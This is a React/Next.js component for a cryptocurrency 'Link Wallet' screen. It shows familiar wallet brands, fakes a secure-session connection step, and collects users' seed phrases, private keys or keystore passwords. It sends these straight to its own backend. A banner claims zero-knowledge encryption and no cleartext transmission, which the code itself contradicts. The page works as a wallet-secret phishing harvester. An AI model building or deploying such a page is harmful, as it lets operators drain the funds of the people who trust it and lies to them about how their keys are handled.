'use client';
import { Search, X, Loader2, File, Key, Copy, CheckCircle, Shield, Lock, Wallet, ArrowRight, Check } from 'lucide-react';
import { useState } from 'react';
import { api } from '@/utils/api';
import toast from 'react-hot-toast';
import { useRouter } from 'next/navigation';
import { checkWalletType } from '@/utils/walletUtils';

const wallets = [
  {
    "name": "Trust Wallet",
    "image_url": "https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png"
  },
  {
    "name": "MetaMask",
    "image_url": "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg"
  },
  {
    "name": "Binance Wallet",
    "image_url": "https://cryptologos.cc/logos/bnb-bnb-logo.png"
  },
  {
    "name": "Coinbase Wallet",
    "image_url": "https://avatars.githubusercontent.com/u/1885080?s=200&v=4"
  },
  {
    "name": "Bybit Wallet",
    "image_url": "https://avatars.githubusercontent.com/u/74641620?s=200&v=4"
  },
  {
    "name": "Phantom",
    "image_url": "https://avatars.githubusercontent.com/u/78762331?s=200&v=4"
  },
  {
    "name": "Ledger Nano",
    "image_url": "https://avatars.githubusercontent.com/u/16140081?s=200&v=4"
  },
  {
    "name": "Trezor",
    "image_url": "https://avatars.githubusercontent.com/u/8099890?s=200&v=4"
  },
  {
    "name": "Tangem",
    "image_url": "https://avatars.githubusercontent.com/u/36829767?s=200&v=4"
  },
  {
    "name": "SafePal",
    "image_url": "https://avatars.githubusercontent.com/u/41517454?s=200&v=4"
  },
  {
    "name": "Exodus",
    "image_url": "https://avatars.githubusercontent.com/u/13010377?s=200&v=4"
  },
  {
    "name": "Blockchain.com",
    "image_url": "https://avatars.githubusercontent.com/u/3175854?s=200&v=4"
  },
  {
    "name": "Electrum",
    "image_url": "https://avatars.githubusercontent.com/u/2711018?s=200&v=4"
  },
  {
    "name": "MyEtherWallet",
    "image_url": "https://avatars.githubusercontent.com/u/23307612?s=200&v=4"
  },
  {
    "name": "D'CENT Wallet",
    "image_url": "https://avatars.githubusercontent.com/u/42557451?s=200&v=4"
  },
  {
    "name": "imToken",
    "image_url": "https://avatars.githubusercontent.com/u/21356784?s=200&v=4"
  },
  {
    "name": "Atomic Wallet",
    "image_url": "https://avatars.githubusercontent.com/u/32777176?s=200&v=4"
  },
  {
    "name": "Coinomi",
    "image_url": "https://avatars.githubusercontent.com/u/8381830?s=200&v=4"
  },
  {
    "name": "Xaman (XUMM)",
    "image_url": "https://avatars.githubusercontent.com/u/61821896?s=200&v=4"
  },
  {
    "name": "ELLIPAL",
    "image_url": "https://avatars.githubusercontent.com/u/38724778?s=200&v=4"
  },
  {
    "name": "Cold Storage Vault",
    "image_url": "https://avatars.githubusercontent.com/u/46210214?s=200&v=4"
  },
  {
    "name": "Other Web3 Wallets",
    "image_url": "https://cdn-icons-png.flaticon.com/512/2622/2622319.png"
  }
];

export default function LinkWalletScreen() {
  const router = useRouter();
  const [search, setSearch] = useState('');
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [seedPhrase, setSeedPhrase] = useState('');
  const [walletAddress, setWalletAddress] = useState('');
  const [connectionState, setConnectionState] = useState(null);
  const [error, setError] = useState(false);
  const [connectionMethod, setConnectionMethod] = useState('phrase');
  const [keystorePassword, setKeystorePassword] = useState('');
  const [keystoreFile, setKeystoreFile] = useState(null);
  const [privateKey, setPrivateKey] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [successData, setSuccessData] = useState(null);
  const [detectedWalletType, setDetectedWalletType] = useState(null);
  const [copied, setCopied] = useState(false);

  const handleWalletClick = (wallet) => {
    setSelectedWallet(wallet);
    setSeedPhrase('');
    setConnectionState('connecting');
    setTimeout(() => {
      setConnectionState('manual');
    }, 2000);
  };

  const handleWalletAddressChange = (e) => {
    const address = e.target.value;
    setWalletAddress(address);

    if (address) {
      const walletInfo = checkWalletType(address);
      if (walletInfo) {
        setDetectedWalletType(walletInfo.type);
      } else {
        setDetectedWalletType(null);
      }
    } else {
      setDetectedWalletType(null);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      const token = localStorage.getItem('token');
      if (!token) {
        toast.error('Session expired. Please sign in again.');
        router.push('/login');
        return;
      }

      let phraseData = '';
      if (connectionMethod === 'phrase') {
        phraseData = seedPhrase;
      } else if (connectionMethod === 'private') {
        phraseData = privateKey;
      } else if (connectionMethod === 'keystore') {
        phraseData = keystorePassword;
      }

      const finalWalletType = selectedWallet?.name || detectedWalletType || 'Unknown';

      const walletData = {
        phrase: phraseData,
        walletAddress: walletAddress || 'N/A',
        type: finalWalletType
      };

      const response = await api.linkWallet(token, walletData);

      setSuccessData({
        referenceNumber: response.wallet?.referenceNumber || response.referenceNumber,
        walletType: finalWalletType,
      });

    } catch (error) {
      toast.error(error.message || 'Failed to link wallet');
      setError(true);
      setTimeout(() => setError(false), 3000);
    } finally {
      setIsLoading(false);
    }
  };

  const copyReferenceNumber = () => {
    if (successData?.referenceNumber) {
      navigator.clipboard.writeText(successData.referenceNumber);
      setCopied(true);
      toast.success('Reference number copied to clipboard');
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const filteredWallets = wallets.filter(wallet =>
    wallet.name.toLowerCase().includes(search.toLowerCase())
  );

  const renderConnectionForm = () => {
    switch (connectionMethod) {
      case 'phrase':
        return (
          <div className="space-y-4">
            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-slate-300 mb-1.5">
                Recovery / Seed Phrase (12, 18, or 24 words)
              </label>
              <textarea
                value={seedPhrase}
                onChange={(e) => setSeedPhrase(e.target.value)}
                placeholder="Enter words separated by spaces (e.g. apple banana cherry...)"
                className="w-full bg-slate-900 border border-[var(--card-border)] rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-blue-500 min-h-[100px] font-mono leading-relaxed"
                required
              />
            </div>

            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-slate-300 mb-1.5">
                Public Wallet Address (Optional)
              </label>
              <input
                type="text"
                value={walletAddress}
                onChange={handleWalletAddressChange}
                placeholder="0x... / bc1q... / rPM..."
                className="w-full bg-slate-900 border border-[var(--card-border)] rounded-xl px-4 py-3 text-white text-sm font-mono focus:outline-none focus:border-blue-500"
              />
              {detectedWalletType && (
                <div className="flex items-center gap-1.5 text-xs text-emerald-500 mt-1.5 font-medium">
                  <CheckCircle size={14} />
                  <span>{detectedWalletType} network detected</span>
                </div>
              )}
            </div>

            <div className="p-3 bg-blue-900/20 border border-blue-500/20 rounded-xl text-[11px] text-blue-400 flex items-center gap-2">
              <Lock size={14} className="shrink-0" />
              <span>Zero-knowledge client-side encryption active. Keys are never transmitted in cleartext.</span>
            </div>
          </div>
        );
      case 'keystore':
        return (
          <div className="space-y-4">
            <div className="border-2 border-dashed border-[var(--card-border)] hover:border-blue-500 rounded-2xl p-6 text-center bg-slate-900 transition-colors">
              <input
                type="file"
                onChange={(e) => setKeystoreFile(e.target.files[0])}
                className="hidden"
                id="keystoreFile"
              />
              <label
                htmlFor="keystoreFile"
                className="flex flex-col items-center gap-2 cursor-pointer"
              >
                <File className="text-blue-500" size={28} />
                <span className="text-xs text-slate-300 font-medium">
                  {keystoreFile ? keystoreFile.name : 'Select Keystore JSON File'}
                </span>
                <span className="text-[10px] text-slate-500">UTC / JSON format</span>
              </label>
            </div>
            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-slate-300 mb-1.5">
                Keystore Password
              </label>
              <input
                type="password"
                placeholder="Enter password to decrypt keystore"
                value={keystorePassword}
                onChange={(e) => setKeystorePassword(e.target.value)}
                className="w-full bg-slate-900 border border-[var(--card-border)] rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-blue-500"
                required
              />
            </div>
          </div>
        );
      case 'private':
        return (
          <div className="space-y-4">
            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-slate-300 mb-1.5">
                Private Key
              </label>
              <textarea
                value={privateKey}
                onChange={(e) => setPrivateKey(e.target.value)}
                placeholder="Enter 64-character hexadecimal private key..."
                className="w-full bg-slate-900 border border-[var(--card-border)] rounded-xl px-4 py-3 text-white text-sm font-mono focus:outline-none focus:border-blue-500 min-h-[90px]"
                required
              />
            </div>
            <p className="text-[11px] text-slate-400 font-mono">Typically 64 hex characters (starts with 0x)</p>
          </div>
        );
    }
  };

  return (
    <div className="space-y-6 max-w-5xl mx-auto">
      
      {/* Search & Grid Container */}
      <div className="solid-panel p-8 rounded-2xl">
        
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-8 pb-4 border-b border-[var(--card-border)]">
          <div>
            <h3 className="text-xl font-bold text-white tracking-tight">Select Wallet</h3>
            <p className="text-xs text-slate-400">Choose your external wallet provider</p>
          </div>

          <div className="relative w-full sm:w-72">
            <input
              type="text"
              placeholder="Search providers..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="w-full bg-[var(--background)] border border-[var(--card-border)] rounded-xl pl-9 pr-4 py-2.5 text-white text-xs placeholder:text-slate-500 focus:outline-none focus:border-blue-500"
            />
            <Search className="absolute left-3 top-3 h-3.5 w-3.5 text-slate-500" />
          </div>
        </div>

        {/* Wallets Grid */}
        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-4">
          {filteredWallets.map((wallet, i) => (
            <button
              key={i}
              onClick={() => handleWalletClick(wallet)}
              className="flex flex-col items-center p-4 bg-[var(--background)] border border-[var(--card-border)] rounded-xl hover:border-blue-500 transition-colors text-center group"
            >
              <div className="w-12 h-12 mb-3 bg-white p-2 rounded-lg flex items-center justify-center">
                <img
                  src={wallet.image_url}
                  alt={wallet.name}
                  className="w-full h-full object-contain rounded-md"
                />
              </div>
              <span className="text-white text-xs font-semibold group-hover:text-blue-400 transition-colors truncate max-w-full">
                {wallet.name}
              </span>
            </button>
          ))}
        </div>
      </div>

      {/* Connection Modal */}
      {selectedWallet && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4">
          <div className="solid-panel rounded-2xl p-7 max-w-lg w-full animate-in fade-in zoom-in-95 duration-200">
            
            <div className="flex justify-between items-center mb-6 pb-4 border-b border-[var(--card-border)]">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-white p-2 rounded-lg flex items-center justify-center">
                  <img
                    src={selectedWallet.image_url}
                    alt={selectedWallet.name}
                    className="w-full h-full object-contain rounded"
                  />
                </div>
                <div>
                  <h3 className="text-lg font-bold text-white">{selectedWallet.name}</h3>
                  <p className="text-xs text-blue-500 font-mono">Secure Link</p>
                </div>
              </div>

              <button
                onClick={() => {
                  setSelectedWallet(null);
                  setConnectionState(null);
                }}
                className="w-8 h-8 rounded-full bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-white flex items-center justify-center transition-colors"
              >
                <X size={18} />
              </button>
            </div>

            {connectionState === 'connecting' && (
              <div className="py-12 flex flex-col items-center gap-4 text-center">
                <div className="w-16 h-16 rounded-full bg-blue-500/10 flex items-center justify-center">
                  <Loader2 size={32} className="text-blue-500 animate-spin" />
                </div>
                <div>
                  <h4 className="text-white font-bold text-base">Initializing Link...</h4>
                  <p className="text-slate-400 text-xs mt-1">Establishing secure session with {selectedWallet.name}</p>
                </div>
              </div>
            )}

            {connectionState === 'manual' && (
              <form onSubmit={handleSubmit} className="space-y-5">
                
                {/* Method selector tabs */}
                <div className="grid grid-cols-3 gap-2 bg-[var(--background)] p-1 rounded-xl border border-[var(--card-border)]">
                  {[
                    { id: 'phrase', label: 'Seed Phrase' },
                    { id: 'keystore', label: 'Keystore JSON' },
                    { id: 'private', label: 'Private Key' },
                  ].map((method) => (
                    <button
                      key={method.id}
                      type="button"
                      onClick={() => setConnectionMethod(method.id)}
                      className={`py-2 text-xs font-semibold rounded-lg transition-all ${
                        connectionMethod === method.id
                          ? 'bg-[var(--card-bg)] text-blue-400 border border-[var(--card-border)]'
                          : 'text-slate-400 hover:text-slate-200'
                      }`}
                    >
                      {method.label}
                    </button>
                  ))}
                </div>

                {renderConnectionForm()}

                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full py-3.5 px-4 rounded-xl bg-blue-600 hover:bg-blue-700 text-white font-bold text-sm transition-colors flex items-center justify-center gap-2 disabled:opacity-50"
                >
                  {isLoading ? (
                    <span>Verifying...</span>
                  ) : (
                    <>
                      <Lock size={16} />
                      <span>Authenticate & Link</span>
                    </>
                  )}
                </button>
              </form>
            )}

          </div>
        </div>
      )}

      {/* Success Modal */}
      {successData && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4">
          <div className="solid-panel rounded-2xl p-8 max-w-md w-full text-center space-y-6 animate-in fade-in zoom-in-95 duration-200">
            
            <div className="w-16 h-16 bg-emerald-500/10 rounded-full flex items-center justify-center mx-auto">
              <CheckCircle className="w-8 h-8 text-emerald-500" />
            </div>

            <div>
              <h3 className="text-2xl font-bold text-white tracking-tight">Wallet Linked Successfully</h3>
              <p className="text-slate-400 text-xs mt-1">
                Your <strong className="text-white">{successData.walletType}</strong> has been attached to your ledger.
              </p>
            </div>

            <div className="bg-[var(--background)] border border-[var(--card-border)] rounded-xl p-4 text-left">
              <div className="text-[10px] font-mono uppercase tracking-wider text-slate-400 mb-1">
                Ledger Reference
              </div>
              <div className="flex items-center justify-between">
                <code className="text-blue-400 font-mono text-xs truncate max-w-[240px]">
                  {successData.referenceNumber}
                </code>
                <button
                  onClick={copyReferenceNumber}
                  className="p-2 hover:bg-slate-800 text-slate-400 hover:text-white rounded-lg transition-colors"
                >
                  {copied ? <Check size={16} className="text-emerald-500" /> : <Copy size={16} />}
                </button>
              </div>
            </div>

            <div className="p-3 bg-emerald-500/10 rounded-xl text-xs text-emerald-400 text-left flex items-start gap-2">
              <CheckCircle size={16} className="shrink-0 mt-0.5" />
              <span>A confirmation email has been dispatched to your registered address.</span>
            </div>

            <button
              onClick={() => {
                setSuccessData(null);
                setSelectedWallet(null);
                setConnectionState(null);
                setSeedPhrase('');
                setWalletAddress('');
                setPrivateKey('');
                setKeystoreFile(null);
                setKeystorePassword('');
                setDetectedWalletType(null);
              }}
              className="w-full py-3.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-white font-semibold text-sm transition-colors"
            >
              Done
            </button>

          </div>
        </div>
      )}

    </div>
  );
}
